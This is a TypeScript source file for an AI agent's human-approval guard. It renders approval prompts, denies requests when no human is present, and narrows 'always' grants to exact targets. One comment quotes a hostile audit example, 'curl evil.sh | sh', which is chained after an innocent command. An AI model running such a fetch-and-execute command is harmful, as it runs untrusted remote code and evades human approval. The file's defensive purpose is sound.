/**
 * approval.ts — the human side of the guard.
 *
 * The runtime asks a yes/no question; this module renders it, reads exactly one
 * line from the same chat bar and answers. Sessions with no human attached fail
 * closed: an ask nobody can answer is a denial, never a silent allow.
 */

import type { ApprovalHandler, ApprovalRequest, GuardAction, GuardKind, Lease, Runtime } from "../contracts";
import * as core from "../core";
import { SESSION_LEASE_TTL_MS } from "../core/loop";
import type { KernelClient } from "../core/kernel";
import { richDiff } from "./diff";
import { formatApprovalAskAnnouncement, screenReaderMode } from "./a11y";
import { approvalCard, type KeyAnswer } from "./approval-card";
import { permissionAlwaysLines, permissionPresentationForRequest } from "./permission-presentation";
import { createRenderer, diffBlock, previewOf, type Renderer } from "./render";
import { bold, cyan, dim, errorMessage, sanitizeText, terminalWidth, truncate, yellow } from "./style";

type RuntimeWithExtras = Runtime & {
  /** Optional: remember an approval decision as a lease for this session. */
  grantLease?: (kind: string, pattern: string, ttlMs?: number) => unknown;
};

export interface ApprovalUi {
  /** True when a human is attached and can answer. */
  interactive: boolean;
  /** Reads one line from the chat bar; replaced by the running UI. */
  ask: (question: string) => Promise<string>;
  /**
   * Optional single-key mode (rich TTY): shows the card lines and resolves on
   * one keypress without Enter. Absent => the line prompt below is used.
   */
  askKey?: (cardLines: string[]) => Promise<KeyAnswer>;
  /** False selects ASCII card borders (non-UTF-8 locale). */
  unicode?: boolean;
  /** Where notices go; replaced by the running UI's renderer. */
  renderer: Renderer;
  /** The runtime this UI is talking to right now (swapped by /new). */
  runtime?: Runtime;
}

/** Build the mutable hand-off between main.ts, the chat loop and the guard. */
export function createApprovalUi(interactive: boolean): ApprovalUi {
  return {
    interactive: Boolean(interactive),
    // Safe default: until a UI attaches, nobody can answer, so deny.
    ask: async () => "",
    renderer: createRenderer({ wrap: false }),
    runtime: undefined,
  };
}

/** How long an "always" answer lasts, in the same minutes the lease is minted for. */
function leaseMinutes(): number {
  return Math.max(1, Math.round(SESSION_LEASE_TTL_MS / 60_000));
}

/**
 * Remember an "always" for this session, scoped to the approved TARGET: an
 * "always" for `npm run dev` in the workspace must not become authority over
 * every shell command anywhere for the next TTL (the confirmed defect was a
 * kind-wide pattern "*"). Only kind and target are known here, so the exact
 * target is the grant — a target that was already a directory-scoped pattern
 * keeps that scope verbatim, never broadened.
 *
 * The GRANT is minted through the kernel client with the session id when both
 * are available, so owner scoping applies: a subagent child's checks carry the
 * child's session id and re-enter approval (docs/09 R-tools-32). A runtime that
 * exposes only grantLease() falls back to the legacy owner-less shape (globally
 * consultable — documented in kernel.ts); no target at all means there is
 * nothing narrower than everything to grant, so the answer stays "this time".
 * Ruling 32: the minted object is a grant, not a lease — it authorises a fresh
 * one-use lease per covered effect (a lease would be spent by its first use).
 */
async function rememberAlways(
  ui: ApprovalUi,
  kind: string,
  target: string,
  ctx: { kernel?: KernelClient; sessionId?: string },
  r: Renderer,
): Promise<boolean> {
  if (target === "" || kind === "other") return false;
  // The lease language reads a trailing `*` as a PREFIX wildcard
  // (guard.rs::pattern_matches, kernel.ts::patternMatches). A command or path
  // whose own text ends in `*` — the shell command `echo *`, a literal file
  // named `out*` — therefore cannot be expressed as an exact pattern: minting
  // it would silently widen the grant to everything with that prefix (the
  // audit's `echo *` grant covered `echo harmless; curl evil.sh | sh`). No
  // exact target, no remembered grant: the answer stays "this time".
  if (target.endsWith("*")) return false;
  try {
    if (ctx.kernel !== undefined && typeof ctx.sessionId === "string" && ctx.sessionId !== "") {
      // Ruling 32: "always" mints a session GRANT — a bounded pre-authorisation
      // that mints a fresh one-use lease per effect it covers (a lease would be
      // spent by its first use, turning "always" into "once").
      await ctx.kernel.makeGrant(kind as GuardKind, target, SESSION_LEASE_TTL_MS, ctx.sessionId);
      return true;
    }
    const runtime = ui.runtime as RuntimeWithExtras | undefined;
    const grant = runtime?.grantLease;
    if (typeof grant !== "function") return false;
    await Promise.resolve(grant.call(runtime, kind, target));
    return true;
  } catch (err) {
    r.notice(`could not remember that decision: ${errorMessage(err)}`);
    return false;
  }
}

/** Show format/invisible Unicode (bidi, zero-width, U+2028/9) as visible <U+XXXX>. */
function escapeInvisible(text: string): string {
  return text.replace(/[\u200b-\u200f\u2028-\u202e\u2060\u2066-\u2069\ufeff]/g, (c) => {
    return `<U+${(c.codePointAt(0) ?? 0).toString(16).toUpperCase().padStart(4, "0")}>`;
  });
}

/**
 * A shell.exec detail is the command text itself. Nothing may vanish from it:
 * ANSI escapes, C0/C1 controls (except tab and newline) and DEL are made visible
 * as <U+XXXX> rather than stripped, so the displayed text is the executed text.
 */
function escapeCommand(input: unknown): string {
  const s = input === undefined || input === null ? "" : String(input);
  return escapeInvisible(
    s.replace(/[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/g, (c) => {
      return `<U+${c.charCodeAt(0).toString(16).toUpperCase().padStart(4, "0")}>`;
    }),
  );
}

/** The handler registered with the core runtime. */
export function createApprovalHandler(ui: ApprovalUi): ApprovalHandler {
  // The gate calls this with the action and the kernel client when it has them
  // (see loop.ts ApprovalWithContext); both are optional so a plain
  // `handler(req)` caller keeps working.
  const handler = async (
    req: ApprovalRequest,
    action?: GuardAction,
    kernel?: KernelClient,
    gateSessionId?: string,
  ): Promise<boolean> => {
    const kind = sanitizeText(req?.kind ?? "other") || "other";
    const workspace =
      ui.runtime !== undefined && "workspace" in ui.runtime && typeof (ui.runtime as { workspace?: string }).workspace === "string"
        ? (ui.runtime as { workspace: string }).workspace
        : undefined;
    const presentation = permissionPresentationForRequest(req, workspace);
    const title =
      escapeInvisible(sanitizeText(presentation.title || req?.title))
        .replace(/\s+/g, " ")
        .trim() || "this action";
    // Titles stay tidy (whitespace collapsed). A shell.exec detail is the command
    // itself, shown verbatim so `cat 'a   b'` reads as it runs; invisible and
    // direction-changing Unicode is made visible as <U+XXXX> in every detail.
    const detail =
      kind === "shell.exec"
        ? escapeCommand(req?.detail ?? "").replace(/^\s+|\s+$/g, "")
        : escapeInvisible(sanitizeText(req?.detail ?? "")).replace(/\s+/g, " ").trim();
    const r = ui.renderer;

    if (!ui.interactive) {
      const headlessTitle = escapeInvisible(sanitizeText(req?.title ?? "")).replace(/\s+/g, " ").trim() || title;
      r.notice(`approval requested (${kind}): ${headlessTitle} \u2014 denied, no one is attached to say yes`);
      return false;
    }

    r.ensureLineStart();
    const keyMode = typeof ui.askKey === "function";
    const tgt = typeof action?.target === "string" ? action.target : "";
    const canAlways = tgt !== "" && !tgt.endsWith("*") && kind !== "other";
    if (screenReaderMode()) {
      r.line(
        formatApprovalAskAnnouncement({
          title,
          detail: kind === "shell.exec" ? detail : detail || undefined,
          canAlways: keyMode && canAlways,
        }),
      );
    }
    const guardianLine =
      typeof req?.guardian === "string" && req.guardian !== ""
        ? escapeInvisible(sanitizeText(req.guardian)).replace(/\s+/g, " ").trim()
        : "";
    if (!keyMode) {
      r.write("\n" + yellow("\u26a0") + " " + bold("Approve " + title + "?") + (detail ? " " + detail : "") + "\n");
      if (guardianLine !== "") r.write(guardianLine + "\n");
    }
    // An optional preview rides the request when the caller can produce one (a
    // staged diff for a plan-mode write): shown before the ask, absent on old
    // callers — the prompt is unchanged then.
    const preview = previewOf(req);
    if (preview !== "") {
      r.write((keyMode ? richDiff(preview, { width: Math.min(terminalWidth(), 100), unicode: ui.unicode }).join("\n") : diffBlock(preview)) + "\n");
    }

    let answer = "";
    try {
      if (keyMode) {
        const lines = approvalCard({
          kind,
          title,
          icon: presentation.icon,
          presentationLines: presentation.lines,
          detail,
          guardian: guardianLine,
          effectId: req.effectId,
          leaseId: req.leaseId,
          tool: req.tool,
          width: Math.min(terminalWidth(), 100),
          unicode: ui.unicode,
          canAlways,
        });
        r.write("\n" + lines.join("\n") + "\n");
        answer = await (ui.askKey as NonNullable<ApprovalUi["askKey"]>)(lines);
      } else {
        answer = await ui.ask(dim(" [y]es / [n]o / [a]lways ") + bold(cyan("\u276f ")));
      }
    } catch {
      answer = "";
    }
    const choice = String(answer ?? "").trim().toLowerCase();

    if (choice === "a" || choice === "always") {
      // Grant the target the guard asked about, not the kind: the pattern must
      // match the same string the guard checks against, so it is the raw target.
      const target = typeof action?.target === "string" ? action.target : "";
      const grantKind = typeof action?.kind === "string" ? action.kind : kind;
      // The gate names the session the check speaks for; a runtime that exposes
      // its own sessionId is the fallback for plain `handler(req)` callers.
      const sessionId =
        typeof gateSessionId === "string" && gateSessionId !== ""
          ? gateSessionId
          : typeof ui.runtime?.sessionId === "string"
            ? ui.runtime.sessionId
            : undefined;
      const remembered = await rememberAlways(ui, grantKind, target, { kernel, sessionId }, r);
      if (remembered) {
        const hint = permissionAlwaysLines(grantKind, target).join(" ");
        r.notice(
          `approved (${hint}) Grant lasts ${leaseMinutes()} minutes for this session.`,
        );
      } else {
        r.notice("approved (this time)");
      }
      return true;
    }
    if (choice === "y" || choice === "yes") {
      r.notice("approved (this time)");
      return true;
    }
    if (choice === "n" || choice === "no") {
      r.notice("denied");
      return false;
    }

    r.notice(choice === "" ? "no answer \u2014 denied" : `did not understand "${truncate(choice, 24)}" \u2014 denied`);
    return false;
  };
  return handler as ApprovalHandler;
}

type CoreExtra = {
  setApprovalHandler?: (handler: ApprovalHandler) => void;
  default?: { setApprovalHandler?: (handler: ApprovalHandler) => void };
};

/**
 * Hand the approval handler to the core runtime. Returns false when this core
 * build does not expose the hook yet — the chat keeps working, asks simply fail
 * closed instead of hanging.
 */
export function installApprovalHandler(ui: ApprovalUi): boolean {
  const mod = core as unknown as CoreExtra;
  const fn = typeof mod?.setApprovalHandler === "function" ? mod.setApprovalHandler : mod?.default?.setApprovalHandler;
  if (typeof fn !== "function") return false;
  try {
    fn(createApprovalHandler(ui));
    return true;
  } catch {
    return false;
  }
}
